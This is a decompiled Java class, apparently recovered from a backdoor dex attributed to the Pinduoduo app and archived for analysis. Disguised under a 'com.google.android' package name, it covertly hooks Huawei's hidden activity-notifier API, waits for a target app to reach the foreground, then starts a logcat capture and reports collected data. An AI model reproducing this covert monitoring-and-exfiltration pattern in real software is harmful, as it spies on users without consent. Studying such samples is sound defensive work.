package com.google.android.sd.biz_dynamic_dex.td.logcat.b;

import android.app.IHwActivityNotifier;
import android.content.ComponentName;
import android.content.Context;
import android.os.Bundle;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.b;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public final class a extends IHwActivityNotifier.Stub implements a.a {
  private Context a;
  
  private com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a b;
  
  private b c;
  
  private String d;
  
  private boolean e = false;
  
  private String f;
  
  public a(Context paramContext, String paramString) {
    try {
      this.a = paramContext;
      this.c = b.a(paramString);
      return;
    } catch (Exception exception) {
      b("impl_init_fail");
      return;
    } 
  }
  
  private void b(String paramString) {
    com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.a(this.a, paramString);
  }
  
  private boolean c() {
    Exception exception;
    try {
      b.a("impl_reg_process_observer");
      Class.forName("com.huawei.android.app.HwActivityTaskManager").getMethod("registerHwActivityNotifier", new Class[] { IHwActivityNotifier.class, String.class }).invoke(null, new Object[] { this, "activityLifeState" });
      this.e = true;
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return true;
    } catch (Exception null) {
      b.a("impl_reg_process_observer_error_".concat(String.valueOf(exception)));
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return false;
    } finally {}
    com.google.android.sd.biz_dynamic_dex.base.a.b();
    throw exception;
  }
  
  private void d() {
    Exception exception;
    try {
      if (this.e) {
        b.a("impl_un_reg_process_observer");
        Class.forName("com.huawei.android.app.HwActivityTaskManager").getMethod("unregisterHwActivityNotifier", new Class[] { IHwActivityNotifier.class }).invoke(null, new Object[] { this });
        this.e = false;
      } 
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return;
    } catch (Exception null) {
      b.a("impl_un_reg_process_observer_error_".concat(String.valueOf(exception)));
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return;
    } finally {}
    com.google.android.sd.biz_dynamic_dex.base.a.b();
    throw exception;
  }
  
  public final void a(String paramString) {
    try {
      String str2;
      String str1;
      b.a("impl_report");
      paramString = com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.c(paramString);
      CmdData cmdData2 = new CmdData(36799, paramString, "client");
      b.a("uuid_".concat(String.valueOf(paramString)));
      JSONObject jSONObject1 = new JSONObject();
      jSONObject1.put("mode", 101);
      jSONObject1.put("version", this.d);
      com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a a1 = this.b;
      if (a1 != null) {
        str2 = a1.b();
      } else {
        str2 = "";
      } 
      boolean bool = TextUtils.isEmpty(str2);
      JSONObject jSONObject2 = new JSONObject();
      jSONObject2.put("config", jSONObject1);
      if (!bool)
        jSONObject2.put("data", str2); 
      CmdData cmdData1 = Utils.buildSucceedRespData(cmdData2, jSONObject2, null);
      CmdHandler.dispatch(this.a, cmdData1);
      Context context = this.a;
      if (bool) {
        str1 = "6";
      } else {
        str1 = "5";
      } 
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.b(context, str1);
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_report_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return;
    } 
  }
  
  public final boolean a() {
    try {
      b.a("impl_start");
      Context context = this.a;
      if (context == null) {
        b("impl_invalid_context");
        return false;
      } 
      if (this.b != null) {
        b("impl_is_working");
        return false;
      } 
      b b1 = this.c;
      if (b1 == null) {
        b("impl_data_is_null");
        return false;
      } 
      this.b = new com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a(context, b1);
      String str = this.c.b;
      this.f = str;
      if (TextUtils.isEmpty(str)) {
        b("impl_package_name_is_null");
        return false;
      } 
      if (!com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.c(this.a, this.f)) {
        b("impl_app_has_uninstall");
        return false;
      } 
      this.d = com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a.e(this.a, this.f);
      return c();
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_start_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return false;
    } 
  }
  
  public final void b() {
    try {
      b.a("impl_stop");
      d();
      if (this.b != null) {
        b.a("impl_stop_core");
        this.b.d();
        this.b = null;
      } 
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_stop_error_");
      stringBuilder.append(exception.getMessage());
      b(stringBuilder.toString());
      return;
    } 
  }
  
  public final void call(Bundle paramBundle) {
    if (paramBundle == null)
      return; 
    try {
      ComponentName componentName = (ComponentName)paramBundle.getParcelable("comp");
      String str = paramBundle.getString("state", "");
      StringBuilder stringBuilder = new StringBuilder("【cmp】");
      stringBuilder.append(componentName);
      stringBuilder.append(";【state】");
      stringBuilder.append(str);
      com.google.android.sd.biz_dynamic_dex.base.a.c();
      if (componentName == null)
        return; 
      str = componentName.getPackageName();
      if (this.f.equalsIgnoreCase(str)) {
        b.a("impl_start_core");
        d();
        com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a a1 = this.b;
        if (a1 != null)
          a1.a(); 
      } 
      return;
    } catch (Exception exception) {
      b.a("impl_activity_resume_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\b\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */